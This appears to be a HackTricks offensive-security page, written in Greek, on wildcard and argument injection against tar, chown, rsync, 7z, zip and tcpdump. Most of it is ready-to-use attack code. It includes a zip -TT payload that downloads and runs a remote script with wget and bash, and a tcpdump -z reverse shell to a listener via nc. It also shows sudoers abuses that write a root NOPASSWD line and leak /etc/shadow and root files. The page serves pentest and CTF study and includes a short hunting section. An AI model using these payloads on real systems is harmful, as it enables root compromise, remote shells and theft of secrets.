# Wildcards: Χρήσιμα Tricks

{{#include ../../banners/hacktricks-training.md}}

> Το **argument injection** μέσω wildcard (γνωστό και ως *glob*) συμβαίνει όταν ένα privileged script εκτελεί ένα Unix binary όπως τα `tar`, `chown`, `rsync`, `zip`, `7z`, … με ένα wildcard χωρίς εισαγωγικά, όπως το `*`.
> Επειδή το shell κάνει expand το wildcard **πριν** εκτελέσει το binary, ένας attacker που μπορεί να δημιουργήσει αρχεία στον working directory μπορεί να κατασκευάσει filenames που ξεκινούν με `-`, ώστε να ερμηνευτούν ως **options αντί για data**, εισάγοντας ουσιαστικά αυθαίρετα flags ή ακόμη και commands.
> Αυτή η σελίδα συγκεντρώνει τα πιο χρήσιμα primitives, πρόσφατη research και σύγχρονες detections για την περίοδο 2023-2025.

## chown / chmod

Μπορείτε να **αντιγράψετε τον owner/group ή τα permission bits ενός αυθαίρετου αρχείου** κάνοντας abuse του flag `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Όταν ο root εκτελέσει αργότερα κάτι όπως:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` γίνεται injected, προκαλώντας σε *όλα* τα αρχεία που ταιριάζουν να κληρονομούν την ιδιοκτησία/permissions του `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (συνδυασμένη επίθεση).  
Δείτε επίσης το κλασικό paper της DefenseCode για λεπτομέρειες.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Εκτελέστε arbitrary commands κάνοντας abuse του **checkpoint** feature:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Μόλις ο root εκτελέσει π.χ. `tar -czf /root/backup.tgz *`, το `shell.sh` εκτελείται ως root.

### bsdtar / macOS 14+

Το προεπιλεγμένο `tar` στις πρόσφατες εκδόσεις του macOS (με βάση το `libarchive`) δεν υλοποιεί το `--checkpoint`, αλλά μπορείτε και πάλι να επιτύχετε code-execution με το flag **--use-compress-program**, το οποίο σας επιτρέπει να καθορίσετε έναν εξωτερικό compressor.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Όταν ένα privileged script εκτελεί `tar -cf backup.tar *`, θα εκκινηθεί το `/bin/sh`.

---

## rsync

Το `rsync` σάς επιτρέπει να παρακάμψετε το remote shell ή ακόμη και το remote binary μέσω command-line flags που ξεκινούν με `-e` ή `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Αν το root αρχειοθετήσει αργότερα τον κατάλογο με `rsync -az * backup:/srv/`, το injected flag εκκινεί το shell σου στην απομακρυσμένη πλευρά.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (λειτουργία `rsync`).

---

## 7-Zip / 7z / 7za

Ακόμη κι όταν το privileged script προσθέτει *αμυντικά* το πρόθεμα `--` στο wildcard (για να σταματήσει το option parsing), το format του 7-Zip υποστηρίζει **αρχεία λίστας αρχείων** προσθέτοντας το `@` πριν από το filename. Σε συνδυασμό με ένα symlink, αυτό σου επιτρέπει να κάνεις *exfiltrate αυθαίρετα αρχεία*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Αν ο root εκτελέσει κάτι όπως:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
Το 7-Zip θα προσπαθήσει να διαβάσει το `root.txt` (→ `/etc/shadow`) ως file list και θα διακόψει τη λειτουργία του, **εκτυπώνοντας τα περιεχόμενα στο stderr**.

Αυτό εξακολουθεί να λειτουργεί με το `-- *`, επειδή το 7-Zip CLI δέχεται ρητά τόσο κανονικά filenames όσο και `@listfiles` ως positional inputs, επομένως ένα literal filename όπως το `@root.txt` εξακολουθεί να αντιμετωπίζεται ειδικά.

---

## zip

Υπάρχουν δύο πολύ πρακτικά primitives όταν μια εφαρμογή περνά filenames που ελέγχονται από τον χρήστη στο `zip` (είτε μέσω wildcard είτε με απαρίθμηση ονομάτων χωρίς `--`).

- RCE μέσω test hook: Το `-T` ενεργοποιεί το “test archive” και το `-TT <cmd>` αντικαθιστά τον tester με ένα arbitrary πρόγραμμα (long form: `--unzip-command <cmd>`). Αν μπορείτε να κάνετε inject filenames που ξεκινούν με `-`, διαχωρίστε τα flags σε distinct filenames, ώστε να λειτουργεί το short-options parsing:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Σημειώσεις
- ΜΗΝ δοκιμάσετε ένα μεμονωμένο filename όπως `'-T -TT <cmd>'` — τα short options αναλύονται ανά χαρακτήρα και θα αποτύχει. Χρησιμοποιήστε ξεχωριστά tokens όπως φαίνεται.
- Αν τα slashes αφαιρούνται από τα filenames από την εφαρμογή, κάντε fetch από ένα bare host/IP (προεπιλεγμένο path `/index.html`) και αποθηκεύστε τοπικά με `-O`, έπειτα εκτελέστε το.
- Μπορείτε να κάνετε debug στο parsing με `-sc` (show processed argv) ή `-h2` (more help), για να κατανοήσετε πώς καταναλώνονται τα tokens σας.

Παράδειγμα (τοπική συμπεριφορά στο zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Αν το web layer επιστρέφει τα `zip` stdout/stderr (συνηθισμένο σε naive wrappers), injected flags όπως `--help` ή failures από bad options θα εμφανιστούν στην HTTP response, επιβεβαιώνοντας το command-line injection και βοηθώντας στη βελτιστοποίηση των payloads.

---

## Επιπλέον binaries ευάλωτα σε wildcard injection (σύντομη λίστα 2023-2025)

Οι παρακάτω εντολές έχουν γίνει αντικείμενο abuse σε σύγχρονα CTFs και πραγματικά environments. Το payload δημιουργείται πάντα ως *filename* μέσα σε έναν writable directory που αργότερα θα υποβληθεί σε επεξεργασία με wildcard:

| Binary | Flag προς abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Read file contents |
| `flock` | `-c <cmd>` | Execute command |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git over SSH |
| `scp`   | `-S <cmd>` | Spawn arbitrary program instead of ssh |

Αυτά τα primitives είναι λιγότερο συνηθισμένα από τα κλασικά *tar/rsync/zip*, αλλά αξίζει να ελέγχονται κατά το hunting.

---

## Hunting για ευάλωτα wrappers και jobs

Πρόσφατα case studies έχουν δείξει ότι το wildcard/argv injection δεν αποτελεί πλέον απλώς πρόβλημα **cron + tar**. Η ίδια bug class εξακολουθεί να εμφανίζεται σε:

- web features που κάνουν "download everything as zip/tar" από attacker-controlled upload directories
- vendor/appliance debug shells που εκθέτουν ένα **tcpdump** wrapper με attacker-controlled filename/filter fields
- backup ή rotation jobs που καλούν `tar`, `rsync`, `7z`, `zip`, `chown` ή `chmod` σε writable directories

Χρήσιμες εντολές triage:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Γρήγορες ευρετικές:

- Το `-- *` αποτελεί καλή λύση για πολλά GNU tools, αλλά **όχι** για τα `7z`/`7za`, επειδή τα `@listfiles` αναλύονται ξεχωριστά.
- Για το `zip`, αναζητήστε wrappers που απαριθμούν απευθείας filenames ελεγχόμενα από τον χρήστη· το short-option splitting (`-T` + `-TT <cmd>`) εξακολουθεί να λειτουργεί ακόμη και χωρίς shell glob.
- Για το `tcpdump`, δώστε ιδιαίτερη προσοχή σε wrappers που σας επιτρέπουν να ελέγχετε **output file names**, **rotation settings** ή ορίσματα **capture-file replay**.

---

## tcpdump rotation hooks (-G/-W/-z): RCE μέσω argv injection σε wrappers

Όταν ένα restricted shell ή vendor wrapper δημιουργεί μια command line για το `tcpdump` συνενώνοντας πεδία που ελέγχονται από τον χρήστη (π.χ. μια παράμετρο "file name") χωρίς αυστηρό quoting/validation, μπορείτε να εισαγάγετε κρυφά επιπλέον flags του `tcpdump`. Ο συνδυασμός των `-G` (time-based rotation), `-W` (limit number of files) και `-z <cmd>` (post-rotate command) επιτρέπει arbitrary command execution ως ο χρήστης που εκτελεί το tcpdump (συχνά ως root σε appliances).

Προϋποθέσεις:

- Μπορείτε να επηρεάσετε το `argv` που περνά στο `tcpdump` (π.χ. μέσω ενός wrapper όπως `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Το wrapper δεν απολυμαίνει spaces ή tokens που ξεκινούν με `-` στο πεδίο του file name.

Κλασικό PoC (εκτελεί ένα reverse shell script από writable path):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1 -W 1` επιβάλλει άμεση περιστροφή μετά το πρώτο matching packet.
- Το `-z <cmd>` εκτελεί την εντολή post-rotate μία φορά ανά περιστροφή. Πολλά builds εκτελούν `<cmd> <savefile>`. Αν το `<cmd>` είναι script/interpreter, βεβαιωθείτε ότι ο χειρισμός των arguments ταιριάζει με το payload σας.

Παραλλαγές χωρίς removable media:

- Αν διαθέτετε οποιοδήποτε άλλο primitive για την εγγραφή αρχείων (π.χ. ένα ξεχωριστό command wrapper που επιτρέπει output redirection), τοποθετήστε το script σας σε γνωστό path και ενεργοποιήστε `-z /bin/sh /path/script.sh` ή `-z /path/script.sh`, ανάλογα με τα semantics της πλατφόρμας.
- Ορισμένα vendor wrappers κάνουν rotate σε locations που ελέγχονται από τον attacker. Αν μπορείτε να επηρεάσετε το rotated path (symlink/directory traversal), μπορείτε να κατευθύνετε το `-z` ώστε να εκτελέσει content που ελέγχετε πλήρως, χωρίς external media.

---

## sudoers: tcpdump με wildcards/επιπλέον args → arbitrary write/read και root

Πολύ συνηθισμένο sudoers anti-pattern:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Προβλήματα
- Το glob `*` και τα permissive patterns περιορίζουν μόνο το πρώτο όρισμα `-w`. Το `tcpdump` δέχεται πολλαπλές επιλογές `-w`· επικρατεί η τελευταία.
- Ο κανόνας δεν περιορίζει άλλες επιλογές, επομένως επιτρέπονται οι `-Z`, `-r`, `-V` κ.λπ.

Primitives
- Παράκαμψη του destination path με δεύτερο `-w` (το πρώτο απλώς ικανοποιεί το sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal μέσα στο πρώτο `-w` για έξοδο από το περιορισμένο δέντρο:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Επιβολή της ιδιοκτησίας των αρχείων εξόδου με `-Z root` (δημιουργεί αρχεία που ανήκουν στον root οπουδήποτε):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Εγγραφή αυθαίρετου περιεχομένου με αναπαραγωγή ενός crafted PCAP μέσω του `-r` (π.χ. για την προσθήκη μιας γραμμής sudoers):

<details>
<summary>Δημιουργήστε ένα PCAP που περιέχει το ακριβές ASCII payload και γράψτε το ως root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Arbitrary file read/secret leak με `-V <file>` (interprets μια λίστα από savefiles). Τα error diagnostics συχνά κάνουν echo τις γραμμές, προκαλώντας leak περιεχομένου:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Αναφορές

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Πλήρης Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [Elastic - Εντοπίστηκε Potential Shell μέσω Wildcard Injection](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)

{{#include ../../banners/hacktricks-training.md}}
